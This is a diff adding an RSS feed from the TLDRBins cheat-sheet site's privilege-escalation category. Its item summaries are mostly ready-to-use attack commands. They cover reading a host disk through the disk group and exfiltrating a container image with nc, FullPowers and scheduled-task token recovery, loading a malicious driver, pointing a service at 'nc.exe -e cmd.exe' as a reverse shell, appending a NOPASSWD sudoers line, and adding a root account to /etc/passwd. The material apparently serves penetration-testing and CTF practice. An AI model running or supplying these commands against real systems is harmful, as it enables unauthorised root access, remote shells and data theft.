@@ -1,0 +1,53 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Privilege Escalation on TLDRBins</title>
+    <link>https://tldrbins.github.io/@privilege-escalation/</link>
+    <description>Recent content in Privilege Escalation on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@privilege-escalation/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>disk group</title>
+      <link>https://tldrbins.github.io/disk/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/disk/</guid>
+      <description>Basic # Show devices lsblk # Device attributes blkid # Show swap on blk swapon -s # Filesystem info cat /etc/fstab Abuse #1: Read host&amp;rsquo;s filesystem from container (root) 1. Open target device debugfs /dev/sda1 # Read ls /root Abuse #2: Read container&amp;rsquo;s filesystem from host 1. Show LVM mappings ls -l /dev/mapper/ 2. Exfil container&amp;rsquo;s filesystem # In our local machine nc -lvnp &amp;lt;LOCAL_PORT&amp;gt; &amp;gt; dm-0.gz # Target container rootfs, e.</description>
+    </item>
+    <item>
+      <title>SeImpresonate</title>
+      <link>https://tldrbins.github.io/seimpresonate/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/seimpresonate/</guid>
+      <description>Abuse #1: Recover SeImpresonate .\FullPowers.exe -c &amp;#34;whoami /priv&amp;#34; # Revshell .\FullPowers.exe -c &amp;#34;&amp;lt;POWERSHELL_3_BASE64&amp;gt;&amp;#34; Ref: FullPower&#xA;Abuse #2: Recover tokens via schedule task # Create a list of privileges [System.String[]]$Privs = &amp;#34;SeAssignPrimaryTokenPrivilege&amp;#34;, &amp;#34;SeAuditPrivilege&amp;#34;, &amp;#34;SeChangeNotifyPrivilege&amp;#34;, &amp;#34;SeCreateGlobalPrivilege&amp;#34;, &amp;#34;SeImpersonatePrivilege&amp;#34;, &amp;#34;SeIncreaseQuotaPrivilege&amp;#34;, &amp;#34;SeIncreaseWorkingSetPrivilege&amp;#34;, &amp;#34;SeTimeZonePrivilege&amp;#34; # Create a Principal for the task $TaskPrincipal = New-ScheduledTaskPrincipal -UserId &amp;#34;&amp;lt;SERVICE_ACCOUNT&amp;gt;&amp;#34; -LogonType ServiceAccount -RequiredPrivilege $Privs # Create an action for the task $TaskAction = New-ScheduledTaskAction -Execute &amp;#34;powershell.exe&amp;#34; -Argument &amp;#34;-Exec Bypass -Command `C:\\Windows\\Tasks\\nc.</description>
+    </item>
+    <item>
+      <title>SeLoadDriverPrivilege</title>
+      <link>https://tldrbins.github.io/seloaddriverprivilege/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/seloaddriverprivilege/</guid>
+      <description>Abuse #1: Install malicious driver 1. Compile eoploaddriver +---------------------------------------------------------------------------------------+ | 1. Open Visual Studio 2022 | | 2. Create a new project | | 3. Project Template : C++ Console App | | 4. Project Name : Eoploaddriver | | 5. Replace code : eoploaddriver.cpp | | 6. Remove header : `include &amp;#34;stdafx.h&amp;#34;` | | 7. Release -&amp;gt; x64 | | 8. Build -&amp;gt; Build Solution | | 9. Exported to C:\Users\user\source\repos\Eoploaddriver\x64\Release\Eoploaddriver.</description>
+    </item>
+    <item>
+      <title>Server Operators</title>
+      <link>https://tldrbins.github.io/server_operators/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/server_operators/</guid>
+      <description>Abuse #1: Change service path 1. Change service path # Assume nc.exe is uploaded sc.exe config &amp;lt;SERVICE&amp;gt; binPath= &amp;#34;C:\ProgramData\nc.exe -e cmd.exe &amp;lt;LOCAL_IP&amp;gt; &amp;lt;LOCAL_PORT&amp;gt;&amp;#34; 2. Restart service # Stop service sc.exe stop &amp;lt;SERVICE&amp;gt; # Start service sc.exe stop &amp;lt;SERVICE&amp;gt; Additional: Create service # Create a service sc.exe create &amp;lt;NEW_SERVICE&amp;gt; binpath= C:\ProgramData\rev.exe start= auto Note: there is a space after named arguments</description>
+    </item>
+    <item>
+      <title>sudoers</title>
+      <link>https://tldrbins.github.io/sudoers/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/sudoers/</guid>
+      <description>Abuse #1: Writable /etc/sudoers chmod 600 /etc/sudoers echo &amp;#39;&amp;lt;USER&amp;gt; ALL=(ALL) NOPASSWD: ALL&amp;#39; &amp;gt;&amp;gt; /etc/sudoers chmod 440 /etc/sudoers </description>
+    </item>
+    <item>
+      <title>Writable /etc/passwd</title>
+      <link>https://tldrbins.github.io/passwd/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/passwd/</guid>
+      <description>Abuse #1: Writable /etc/passwd # Check ls -l /etc/passwd /etc/shadow # Create password hash openssl passwd -1 password # Add to /etc/passwd echo &amp;#39;user:$1$mQ8Xk.u8$XjFlyg01xLRjhCK/v//Qe/:0:0:comment:/root:/bin/bash&amp;#39; &amp;gt;&amp;gt; /etc/passwd # Get root shell su - user </description>
+    </item>
+  </channel>
+</rss>
